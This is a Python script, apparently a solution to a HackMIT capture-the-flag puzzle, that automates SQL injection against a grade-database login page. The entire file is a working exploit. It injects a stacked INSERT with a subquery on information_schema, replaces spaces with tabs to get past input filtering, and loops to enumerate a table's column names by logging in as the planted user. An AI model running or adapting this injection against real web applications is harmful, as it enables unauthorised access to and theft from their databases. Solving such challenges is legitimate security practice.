# -*- coding: utf-8 -*-
import string
import random

import requests

url = 'https://gradebase.hackmit.academy/u/Vivswan_5c6aaa/login'
columns = ['id', 'user_id', 'classname', 'grade', 'code', 'credits']

while True:
    requests.post("https://gradebase.hackmit.academy/u/Vivswan_5c6aaa/reset")
    data = {
        'username': "Vivswan_5c6aaa'; INSERT INTO \"user\" values (10, 'abc', (SELECT column_name FROM information_schema.COLUMNS WHERE table_name = 'grade' ",
        'password': "%"
    }
    for i in columns:
        data['username'] += f" and not column_name='{i}' "
    data['username'] += " LIMIT 1))  --"

    data['username'] = data['username'].replace(" ", " \t ")
    x = requests.post(url, data=data)
    print(x.text)

    x = requests.post(url, data={'username': 'abc'})
    for i in x.text.split("\n"):
        if i.__contains__("Year"):
            columns.append(i.replace("Year:", "").replace("<h5>", "").replace("</h5>", "").strip())
            print(columns)

    if columns[-1] == 'None':
        break
